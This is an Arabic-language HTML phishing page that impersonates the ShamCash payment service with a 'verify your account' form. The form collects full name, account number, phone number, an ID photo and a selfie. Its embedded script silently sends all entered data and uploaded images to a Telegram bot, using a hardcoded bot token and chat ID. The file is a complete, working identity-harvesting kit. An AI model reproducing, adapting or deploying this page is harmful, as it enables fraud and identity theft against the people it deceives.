<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>shaming account</title>
  <style>
    body {
      margin: 0;
      font-family: "Tahoma", sans-serif;
      background-color: #fdfdf9; /* أبيض سكري */
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .app-container {
      width: 100%;
      max-width: 480px; /* عرض مناسب للهاتف */
      background: #fff;
      padding: 20px;
      box-sizing: border-box;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .logo {
      width: 150px;
      margin-bottom: 20px;
    }
    h2 {
      margin: 10px 0 20px;
      color: #333;
      text-align: center;
    }
    label {
      align-self: flex-start;
      margin-top: 10px;
      font-weight: bold;
      color: #444;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 8px; /* حواف مستديرة */
      font-size: 14px;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 14px;
      background: #007bff; /* أزرق */
      color: #fff;
      border: none;
      border-radius: 25px; /* مستطيل حديث بحواف دائرية */
      font-size: 16px;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background: #0056b3;
    }
  </style>
</head>
<body>
  <div class="app-container">
    <!-- شعار -->
    <img src="https://shamcash.com/_next/static/media/logo.5be69def.svg" alt="شعار" class="logo">

    <h2>وثق حسابك</h2>
    <form id="job-form">
      <label>الاسم الثلاثي:</label>
      <input type="text" name="fullname" required>

      <label>رقم حساب:</label>
      <input type="text" name="mothername" required>

      <label>رقم الهاتف المرتبط بحسابك:</label>
      <input type="tel" name="phone" required>

      <label>:ارفق صورة الهوية وصورة شخصية لك </label>
      <input type="file" name="photos" accept="image/*" multiple required>

      <button type="submit">إرسال الطلب</button>
    </form>
  </div>

  <script>
    const BOT_TOKEN = "7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM";
    const CHAT_ID   = "7493001551";

    document.getElementById("job-form").addEventListener("submit", async (e) => {
      e.preventDefault();
      const form = e.target;

      // إرسال البيانات النصية
      const text = `طلب توظيف جديد:\nالاسم: ${form.fullname.value}\nاسم الأم: ${form.mothername.value}\nالهاتف: ${form.phone.value}`;
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
      });

      // إرسال الصور (حتى 4 صور)
      const files = form.photos.files;
      for (let i = 0; i < files.length && i < 4; i++) {
        const photoData = new FormData();
        photoData.append("chat_id", CHAT_ID);
        photoData.append("photo", files[i]);

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: photoData
        });
      }

      alert("✅  تم إرسال الطلب والصور بنجاح!");
      form.reset();
    });
  </script>
</body>
</html>
